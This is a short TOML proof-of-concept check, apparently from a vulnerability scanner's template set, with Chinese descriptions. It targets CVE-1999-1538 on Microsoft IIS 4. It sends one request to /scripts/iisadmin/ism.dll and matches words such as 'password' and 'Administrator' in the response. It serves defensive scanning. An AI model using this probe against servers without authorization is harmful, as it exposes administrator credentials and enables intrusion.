[info]
author = "ave"
description = "检测 IIS 4 系统是否遗留 /scripts/iisadmin 目录未限制访问权限，攻击者可通过 Web 访问获取敏感服务器信息，包括管理员密码。"
id = "POC-AVE-1999-1301"
name = "Microsoft IIS 4（Windows NT）远程基于Web的行政管理功能安全漏洞 PoC"
severity = "medium"
tags = ["ave-1999-1301"]
vuln_id = [
    "CVE-1999-1538",
    "AVE-1999-1301",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/scripts/iisadmin/ism.dll"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "Administrator",
    "cPassword",
]
